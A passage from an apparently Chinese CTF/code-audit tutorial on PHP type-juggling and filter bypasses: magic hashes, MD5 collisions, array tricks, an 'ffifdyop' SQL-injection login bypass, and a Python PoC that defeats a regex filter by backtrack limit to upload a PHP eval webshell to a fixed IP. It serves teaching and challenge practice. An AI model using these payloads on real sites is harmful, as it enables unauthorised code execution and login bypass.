&quot;admin&quot;==0)                                //true var_dump(false==&quot;&quot;==0==NULL)                        //true</code></pre><ol start="2"><li>布尔值true和任意字符串都弱相等。例如:  </li></ol><pre><code class="php">var_dump(true==&quot;hyuf&quot;)                   //true</code></pre><ol start="3"><li>数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；  (例外:-1.3e3转换为浮点数是-1300)</li><li>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；  </li><li>当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。<br>例题:</li></ol><pre><code class="php">&lt;?phpshow_source(__FILE__);$a=@$_GET[&#39;a&#39;];$b=@$_GET[&#39;b&#39;];if ($a==0 and $a)&#123;    echo &quot;this is flag1&quot;;&#125;if(is_numeric($b))&#123;    exit();&#125;if ($b&gt;1234)&#123;    echo &quot;this is flag2&quot;;&#125;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663916772482-0a859568-2fd9-4c46-88e9-682985095366-16691231881951.png" alt="image.png"><br>a为0但是a又恒为true，我们直接传入一个字母即可  //根据转换规则一<br>b变量要得到flag必须不是一个数字，但是又要与数字比较，我们传入任意一个比1234大的数字，然后再加上字母即可绕过。  //根据转换规则一</p><h3 id="hash比较操作符问题"><a href="#hash比较操作符问题" class="headerlink" title="hash比较操作符问题"></a>hash比较操作符问题</h3><pre><code class="php"> &lt;?phpshow_source(__FILE__);$a = $_GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if (md5($a) == md5($b)&amp;&amp;$a!=$b)&#123;    print(&quot;this is flag!&quot;);&#125;?&gt; </code></pre><h4 id="数组绕过-和-都适用"><a href="#数组绕过-和-都适用" class="headerlink" title="数组绕过(==和===都适用)"></a>数组绕过(==和===都适用)</h4><pre><code class="php">md5(string,raw)md5()进行比较时，可以两个里面输入数组，这样都是False,等于，可以绕过</code></pre><p>我们直接传入数组即可绕过</p><pre><code class="php">http://127.0.0.1/test.php?a[]=1&amp;b[]=2</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663919320968-ea0a76f6-3f11-491e-9e2f-53475e0abca5.png" alt="image.png"></p><h4 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h4><pre><code class="php">&lt;?phpshow_source(__FILE__);$str1 = (string)$_GET[&#39;str1&#39;];$str2 = (string)$_GET[&#39;str2&#39;];if (!empty($str1)&amp;&amp;!empty($str2))&#123;    if ($str1!=$str2)&#123;        if (md5($str1) === md5($str2)) &#123;            print (&quot;this is flag&quot;);        &#125;       &#125;&#125;?&gt;</code></pre><p> 由于强制类型转换，传数组就不可行了，这里就需要MD5碰撞，对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll就可以了<br>下载链接:<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a><br>1.在目录下新建立一个文件如下<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033361111-43dbc858-3a86-4e0e-ba38-6c58f5d42496.png" alt="image.png"><br>2.将这个文件拖到fastcoll_v1.0.0.5.exe上，等于使用fastcoll打开它。<br>3.fastcoll会自动生成两个文件：<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663925372001-9f7671f0-2ff8-4b8d-9fd5-92f6acbdc23a.png" alt="image.png"><br> 这两个文件内容不同，但是md5值是相同的。<br>然后我们写一个php脚本根据生成的文件生成碰撞的字符串：  </p><pre><code class="php">&lt;?phpfunction readmyfile($path)&#123;    $fh = fopen($path, &quot;rb&quot;);    $data = fread($fh, filesize($path));    fclose($fh);    return $data;&#125;$a = urlencode(readmyfile(&quot;HY_msg1.txt&quot;));$b = urlencode(readmyfile(&quot;HY_msg2.txt&quot;));if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;    echo &quot;a=&quot;;    echo $a;    echo &quot;\n&quot;;&#125;if(urldecode($a)!=urldecode($b))&#123;    echo &quot;b=&quot;;    echo $b;&#125;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033454749-29f51681-e0f7-46fd-a3b7-afbae9586942.png" alt="image.png"></p><pre><code class="php">a=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%A7%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3%F1%95inQw%B1%EA%C3%7D%B9%1D%89%7D%CB%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84F%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%00%06%9E%D1%D0f%25w%C6%23%F2%CCT%C9%FC%AC%A9%D3%17b=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%27%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3q%96inQw%B1%EA%C3%7D%B9%1D%89%7DK%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84%C6%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%80%05%9E%D1%D0f%25w%C6%23%F2%CCT%C9%7C%AC%A9%D3%17</code></pre><pre><code class="php">收录一些MD5值相等的字符串      $Param1=&quot;fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975%EA%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%DDa7%D0%40%C6i%97%10l%84%9D%BA%7FK%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhjj%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2AF%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0Cw%0E%A3%94%9B&quot;      $Param2=&quot;fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975j%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%5Db7%D0%40%C6i%97%10l%84%9D%BA%7F%CB%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhj%EA%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2%C1E%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0C%F7%0E%A3%94%9B&quot;          $Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;    $Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;    $data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;    $data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</code></pre><p>传入我们生成的两个值</p><pre><code class="php">http://127.0.0.1/test.php?str1=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%A7%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3%F1%95inQw%B1%EA%C3%7D%B9%1D%89%7D%CB%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84F%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%00%06%9E%D1%D0f%25w%C6%23%F2%CCT%C9%FC%AC%A9%D3%17&amp;str2=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%27%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3q%96inQw%B1%EA%C3%7D%B9%1D%89%7DK%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84%C6%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%80%05%9E%D1%D0f%25w%C6%23%F2%CCT%C9%7C%AC%A9%D3%17</code></pre><p>成功获得flag<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033627297-8e5b705a-634b-460a-9375-3634ea0257b1.png" alt="image.png"></p><h4 id="0e开头的字符串在参与比较时-会被当做科学计数法-结果转换为0-弱比较-才适用"><a href="#0e开头的字符串在参与比较时-会被当做科学计数法-结果转换为0-弱比较-才适用" class="headerlink" title="0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0(弱比较==才适用)"></a>0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0(弱比较==才适用)</h4><p> 比如将两个md5值进行弱类型比较</p><pre><code class="php">md5(&#39;QNKCDZO&#39;) == md5(240610708) MD5加密后会变成这个样子0e830400451993494058024219903391 == 0e462097431906509019562988736854</code></pre><p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样<br>0 == 0<br>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等<br>常见md5为0e开头的字符串</p><pre><code class="php">s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020</code></pre><pre><code class="php">#授人以鱼不如授人以渔，下面使多线程MD5哈希碰撞脚本，威力巨大。是根据网上代码改编而成，非原创。#上面脚本注释部分是双MD5碰撞，取消注释然后注释掉24行stopxxx即可。#使用方法：python md5Crack.py &quot;你要碰撞的字符串&quot; 字符串的起始位置#例如：python md5Crack.py “0e&quot; 0#将产生MD5值为0e开头的字符串。#使用环境:python2#使用时请将上述注释全部删除# -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len,start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#39;&#39;.join(random.choice(CHARS) for _ in range(size))        md5 = hashlib.md5(rnds)        value = md5.hexdigest()        if value[start: start+str_len] == substr:            print rnds            stop_event.set()            &#39;&#39;&#39;            #碰撞双md5            md5 = hashlib.md5(value)            if md5.hexdigest()[start: start+str_len] == substr:                print rnds+ &quot;=&gt;&quot; + value+&quot;=&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;                stop_event.set()            &#39;&#39;&#39; if __name__ == &#39;__main__&#39;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,                                         stop_event, str_len, start_pos))                 for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663922788700-7d0c2c85-a2f9-4d71-af8e-ec0d941ba1e9.png" alt="image.png"></p><h4 id="绕过md5构造恒为真语句"><a href="#绕过md5构造恒为真语句" class="headerlink" title="绕过md5构造恒为真语句"></a>绕过md5构造恒为真语句</h4><pre><code class="php">select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p>pass输入</p><pre><code class="php">ffifdyop</code></pre><p> 这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’。等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数  </p><h4 id="特殊的md5值"><a href="#特殊的md5值" class="headerlink" title="特殊的md5值"></a>特殊的md5值</h4><p>双md5结果仍为0e开头字符串大全</p><pre><code class="php">      0e215962017                0e291242476940776845150308577824         CbDLytmyGm2xQyaLNhWn         md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18         md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af         770hQgrBOjrcqftrlaZk         md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625         md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064         7r4lGXCH2Ksu2JNT3BYM         md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849         md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</code></pre><h3 id="十六进制转换问题"><a href="#十六进制转换问题" class="headerlink" title="十六进制转换问题"></a>十六进制转换问题</h3><p>我们来看一个例子:</p><pre><code class="php">&lt;?phpif (&quot;0x1e240&quot;==&quot;123456&quot;)&#123;    print &quot;1\n&quot;;    if (&quot;0x1e240&quot;==123456)&#123;        print &quot;2\n&quot;;        if (&quot;0x1e240&quot;==&quot;1e240&quot;)&#123;            print &quot;3&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664034227137-6faf04cb-61b1-4d5e-9440-6dae4bb92b20.png" alt="image.png"><br>php在接受一个带0x的字符串的时候，会自动把这行字符串解析成十进制的再进行比较，0x1e240解析成十进制就是123456，并且与字符串类型的123456和int型的123456都相同。<br>ctf题目:</p><pre><code class="php">&lt;?php    function noother_says_correct($number)&#123;        $one = ord(&#39;1&#39;);        $nine = ord(&#39;9&#39;);        for ($i = 0; $i &lt; strlen($number); $i++) &#123;            $digit = ord($number&#123;$i&#125;);            if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;                return false;            &#125;        &#125;        return $number == &#39;54975581388&#39;;    &#125;    $flag=&#39;flag&#123;This_Is_f1ag&#125;&#39;;    if(noother_says_correct($_GET[&#39;key&#39;]))        echo $flag;    else        echo &#39;access denied&#39;;</code></pre><p>题目的大概意思就是说，我们要传入一个字符串，里面没有数字，但是要和54975581388相等，而54975581388这个数的16进制很巧妙，没有任何数字</p><pre><code class="php">print base_convert(&quot;54975581388&quot;,10,16);  //ccccccccc</code></pre><p>那我们就可以用16进制来绕过<br>payload:</p><pre><code class="php">http://127.0.0.1/test.php?key=0xccccccccc</code></pre><h3 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h3><p> JSON概念很简单，JSON 是一种轻量级的数据格式，他基于 javascript 语法的子集，即数组和对象表示。由于使用的是 javascript 语法，因此JSON 定义可以包含在javascript 文件中，对其的访问无需通过基于 XML 的语言来额外解析。<br>示例:</p><pre><code class="php">&lt;?phpif (isset($_POST[&#39;message&#39;])) &#123;    $message = json_decode($_POST[&#39;message&#39;]);    $key =&quot;*********&quot;;    if ($message-&gt;key == $key) &#123;        echo &quot;flag&quot;;    &#125;    else &#123;        echo &quot;fail&quot;;    &#125;&#125;else&#123;     echo &quot;~~~~&quot;;&#125;?&gt;</code></pre><p>输 入一个数组进行json解码，如果解码后的message与key值相同，会得到flag，主要思想还是弱类型进行绕过，我们不知道key值是什莫，但是我们知道一件事就是它肯定是字符串(当然，这里的前提条件是key中没有数字)，这样就可以了，上文讲过，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了。最终payload message={“key”:0}。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664112502794-d8342c7e-bf22-4eee-9c3b-96463cb2bf28.png" alt="image.png"></p><h2 id="php内置函数的松散性"><a href="#php内置函数的松散性" class="headerlink" title="php内置函数的松散性"></a>php内置函数的松散性</h2><p> 主要意思就是php内部函数在调用时给函数传递函数无法接受的参数类型但是却没有报错的情况  </p><h3 id="MD5-，sha1绕过"><a href="#MD5-，sha1绕过" class="headerlink" title="MD5 ，sha1绕过"></a>MD5 ，sha1绕过</h3><p>这两个都是加密函数，分别给字符串进行MD5加密和计算字符串的 SHA-1 散列。<br>但是这个函数都有着缺陷，就是不能处理数组，这样就很容易被绕过了</p><pre><code class="php">&lt;?phpif (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;    if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])        if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))            die(&quot;flag&#123;This_Is_F1ag&#125;&quot;);    else        print &#39;Wrong.&#39;;&#125;?&gt;</code></pre><p>直接构造数组就可以绕过了payload: a[]=1&amp;b[]=2<br>也就是上文的hash比较中的数组绕过，为了方便总结hash的知识点，就把那里的绕过方法都写了上去</p><h3 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h3><p>缺陷原理相同，绕过姿势相同，如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p><pre><code class="php">&lt;?php$i =&quot;3name&quot;;switch ($i) &#123;    case 0:case 1:case 2:        echo &quot;this is two&quot;;        break;        case 3:            echo &quot;flag&#123;This_is_f1ag&#125;&quot;;            break;&#125;?&gt;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664113177992-39954b95-885f-4b97-a02a-e5d6f30c7eb8.png" alt="image.png"></p><h3 id="strcmp绕过-这个时候程序输出的是，类型转换的i，结果为3返回flag"><a href="#strcmp绕过-这个时候程序输出的是，类型转换的i，结果为3返回flag" class="headerlink" title="strcmp绕过(这个时候程序输出的是，类型转换的i，结果为3返回flag )"></a>strcmp绕过(这个时候程序输出的是，类型转换的i，结果为3返回flag )</h3><p>strcmp()函数在PHP官方手册中的描述是int strcmp ( string str1,stringstr2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值</p><pre><code class="php">&lt;?php$password=&quot;***************&quot;;if(isset($_POST[&#39;password&#39;]))&#123;if (strcmp($_POST[&#39;password&#39;], $password) == 0) &#123;        echo &quot;Right!!!login success&quot;;        exit();     &#125; else &#123;     echo &quot;Wrong password..&quot;;      &#125;?&gt;</code></pre><p>在这个题目中我们需要自己输入一个password的值和$password相比较但是我们不知道这个password的值，有可能时字符串有可能时数字，这个时候怎末办呢，依然时相同的绕过姿势，试一试数组绕过假设如果传入一个数组会怎末样呢？我们传入password[]=xxx ，绕过成功。<br>原理是因为函数接受到了不符合的类型，将发生错误，函数返回值为0，所以判断相等。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664115029345-c4396917-332e-43ca-8625-e84c1f5fe398.png" alt="image.png"></p><h3 id="array-search（）、in-array-绕过"><a href="#array-search（）、in-array-绕过" class="headerlink" title="array_search（）、in_array()绕过"></a>array_search（）、in_array()绕过</h3><pre><code class="php">mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] ) </code></pre><p> array_search() 函数在数组中搜索某个键值，并返回对应的键名。<br>in_array() 函数搜索数组中是否存在指定的值。<br>基本功能是相同的，也就是说绕过姿势也相同。Array系列有两种安全问题，一种是正常的数组绕过，一种是<br>“= =”号问题。先讲第一个数组绕过。<br>如果两个函数的第三个参数为true那么下列方法就无效了<br> needle，haystack必需，strict可选 函数判断haystack中的值是存在needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤  </p><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><pre><code class="php">&lt;?phpif(!is_array($_GET[&#39;test&#39;]))&#123;    exit();&#125;$test=$_GET[&#39;test&#39;];for($i=0;$i&lt;count($test);$i++)&#123;    if($test[$i]===&quot;admin&quot;)&#123;        echo &quot;error&quot;;        exit();    &#125;    $test[$i]=intval($test[$i]);&#125;if(array_search(&quot;admin&quot;,$test)===0)&#123;    echo &quot;flag&quot;;&#125;else&#123;    echo &quot;false&quot;;&#125;?&gt;</code></pre><p> 先判断是不是数组，然后在把数组中的内容一个个进行遍历，所有内容都不能等于admin,类型也必须相同，然后转化成int型，然后再进行比较如果填入值与admin相同，则返回flag,如何绕过呢？<br> 基本思路还是不变，因为用的是三个等于号，所以说“= =”号这个方法基本不能用，那就用第二条思路，利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。这里的重点是intval函数，将数组里的数转换为了int类型，当”admin”这个字符串和数组的数据比较时会变为0，所以payload：test[]=0。  同理，因为intval将数组里的数转换为了int类型，所以我们传入一个字符串还是会变为0，最终效果和直接传入0是一样的。<br>payload：test[]=xxxxx<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664122013954-962e04ee-e03f-49b3-afbb-ae3cc4b1b61c.png" alt="image.png"></p><h4 id="问题"><a href="#问题" class="headerlink" title="==问题"></a>==问题</h4><p>在PHP手册中，in_array()函数的解释是bool in_array ( mixed needle,arrayhaystack [, bool strict=FALSE]),如果strict参数没有提供或者是false(true会进行严格的过滤)，那么inarray就会使用松散比较来判断needle是否在$haystack中。当strince的值为true时，in_array()会比较needls的类型和haystack中的类型是否相同<br>参考例子:</p><pre><code class="php">&lt;?php$array=[0,1,2,&#39;3&#39;];var_dump(in_array(&#39;abc&#39;, $array));  //truevar_dump(in_array(&#39;1bc&#39;, $array));  //true</code></pre><p>通过例子我们就知道了，这个松散的判断就是等于号，所以出现了“= =”号的特性“abc”==0、“1bc”==1，如果不加true的话就可以利用“= =”轻松绕过。array_search同理</p><h2 id="preg-match绕过"><a href="#preg-match绕过" class="headerlink" title="preg_match绕过"></a>preg_match绕过</h2><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664203268848-481347db-314f-49d6-8d10-90798407e863.png" alt="1270588-20200115184356475-448487219.png"><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664203281706-4da909d4-bb4a-4c22-a766-b765b4620ef2.png" alt="1270588-20200115184407398-525177328.png"><br><strong>绕过方法：</strong></p><h3 id="数组绕过-1"><a href="#数组绕过-1" class="headerlink" title="数组绕过"></a>数组绕过</h3><p> preg_match只能处理字符串，当传入的subject是数组时会返回false  </p><pre><code class="php">&lt;?php//模式分隔符后的&quot;i&quot;标记这是一个大小写不敏感的搜索show_source(__FILE__);$a = $_GET[&#39;x&#39;];if (preg_match(&quot;/php/i&quot;, $a)) &#123;    echo &quot;查找到匹配的字符串 php。&quot;;&#125; else &#123;    echo &quot;未发现匹配的字符串 php。&quot;;&#125;?&gt;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664205498275-3b5e7f1d-dbd6-4b3b-962d-2ff47b09c215.png" alt="image.png"><br>此时我们传入的数组中有flag，但是并没有检测到</p><h3 id="PCRE回溯次数限制"><a href="#PCRE回溯次数限制" class="headerlink" title="PCRE回溯次数限制"></a>PCRE回溯次数限制</h3><p>题目:pcrewaf</p><pre><code class="php">&lt;?phpfunction is_php($data)&#123;    return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);&#125;if(empty($_FILES)) &#123;    die(show_source(__FILE__));&#125;$user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);$data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);if (is_php($data)) &#123;    echo &quot;bad request&quot;;&#125; else &#123;    @mkdir($user_dir, 0755);    $path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;;    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path);    header(&quot;Location: $path&quot;, true, 303);&#125;</code></pre><p> 大意是判断一下用户输入的内容有没有PHP代码，如果没有，则写入文件。这种时候，如何绕过is_php()函数来写入webshell呢？<br> PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664206312119-a1275f6a-f3b0-4d55-bd36-d6aa1f4558b5.png" alt="image.png"><br> 我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。<br>poc:</p><pre><code class="python">import requestsfrom io import BytesIOfiles = &#123;  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);//&#39; + b&#39;a&#39; * 1000000)&#125;res = requests.post(&#39;http://51.158.75.42:8088/index.php&#39;, files=files, allow_redirects=False)print(res.headers)</code></pre><p>题目二:</p><pre><code class="php">&lt;?phpshow_source(__FILE__);function 